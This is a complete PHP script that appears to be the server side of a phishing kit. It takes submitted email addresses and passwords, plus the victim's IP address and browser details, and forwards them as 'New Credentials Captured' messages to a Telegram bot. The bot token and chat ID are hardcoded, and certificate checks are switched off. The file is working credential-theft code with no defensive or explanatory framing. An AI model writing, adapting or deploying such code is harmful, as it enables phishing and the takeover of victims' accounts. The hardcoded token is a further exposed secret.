<?php
// send_telegram.php - Handles Telegram notifications

header('Content-Type: application/json');

// Telegram configuration
define('BOT_TOKEN', '8689377186:AAF8D6cJQkSjdpUbInbcLIeec84-AykR0mg');
define('CHAT_ID', '5358329332');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Get POST data
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';
$ip = isset($_POST['ip']) ? $_POST['ip'] : '';
$userAgent = isset($_POST['userAgent']) ? $_POST['userAgent'] : '';
$timestamp = isset($_POST['timestamp']) ? $_POST['timestamp'] : date('Y-m-d H:i:s');

// Validate input
if (empty($email) || empty($password)) {
    http_response_code(400);
    echo json_encode(['signal' => 'error', 'msg' => 'Email and password are required']);
    exit;
}

// Build Telegram message
$message = "🔐 New Credentials Captured 🔐\n\n";
$message .= "📧 Email: " . $email . "\n";
$message .= "🔑 Password: " . $password . "\n";
$message .= "🌐 IP: " . $ip . "\n";
$message .= "⏰ Time: " . $timestamp . "\n";
$message .= "🖥️ Browser: " . $userAgent . "\n\n";
$message .= "#Credentials #Capture";

// Prepare API request
$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";

$postData = [
    'chat_id' => CHAT_ID,
    'text' => $message,
    'parse_mode' => 'HTML'
];

// Initialize cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

// Execute cURL request
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Return response
if ($httpCode == 200) {
    echo json_encode(['signal' => 'ok', 'msg' => 'Telegram message sent']);
} else {
    http_response_code(500);
    echo json_encode(['signal' => 'error', 'msg' => 'Failed to send Telegram message']);
    //echo json_encode(['signal' => 'ok', 'msg' => 'Telegram message sent']);
}
?>
